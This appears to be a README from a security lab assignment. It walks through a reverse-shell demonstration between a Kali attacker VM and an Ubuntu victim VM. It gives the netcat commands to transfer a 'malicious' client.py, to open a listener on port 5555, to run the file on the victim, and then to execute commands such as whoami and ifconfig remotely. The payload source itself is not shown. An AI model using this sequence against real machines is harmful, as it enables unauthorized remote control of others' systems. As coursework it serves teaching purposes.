Note:
- You'll need to have netcat in kali linux machine
- Refer to Question1.pdf for a quick look on client.py and how to run
- Machine's IP (Kali, Ubuntu)
    - Kali IP: inet 10.0.2.15  netmask 255.255.255.0
    - Ubuntu IP: inet 10.0.2.5 netmask 255.255.255.0

Steps on running:
1. Transferring client.py from Kali to Ubuntu on port 5555:
    - Kali: nc -w 3 10.0.2.5 5555 < client.py
    - refer to screenshot 1
    - ubuntu: nc -l -p 5555 > client.py
    - refer to screenshot 2

2. Kali connecting port 5555 and running netcat:
    - nc -v -l -p 5555
    - refer to screenshot 3

3. Ubuntu will run the malicious file (client.py) from step 1:
    - python3 client.py
    - refer to screenshot 4

4. Once successfully connected, the system will alert hacker that have been connected to Ubuntu:
    - refer to screenshot 5

5. Attacker will then run executable commands such as whoami, ls and ifconfig:
    - refer tp screenshot 6
